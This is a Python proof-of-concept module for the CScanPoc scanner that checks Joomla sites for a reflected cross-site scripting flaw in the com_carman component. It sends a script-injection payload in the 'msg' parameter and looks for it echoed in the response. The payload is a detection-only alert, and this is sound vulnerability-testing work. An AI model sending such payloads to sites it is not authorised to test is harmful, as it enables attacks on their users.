# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0036'  # 平台漏洞编号
    name = 'Joomla Component com_carman Cross Site Scripting Vulnerability'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2009-12-24'  # 漏洞公布时间
    desc = '''
        Joomla组件com_carman由于参数msg过滤不严格，导致出现反射性XSS漏洞。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-18676'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'eb33285e-0526-40f7-a19c-3800240164a8'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 特征字符串
            strxss = "<0x!Q_az*^~>"
            # 构造XSS验证的payload
            payload = '"><script>alert(/'+strxss+'/)</script>'
            # 漏洞访问地址
            exploit = '/index.php?option=com_carman&msg='
            # 自定义的HTTP头
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive',
                "Content-Type": "application/x-www-form-urlencoded"
            }
            # 构造访问地址
            vulurl = arg + exploit + payload
            # 访问
            resp = requests.get(vulurl, headers=httphead, timeout=50)
            # 判断返回结果
            if resp.status_code == 200 and '<script>alert(/'+strxss+'/)</script>' in resp.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
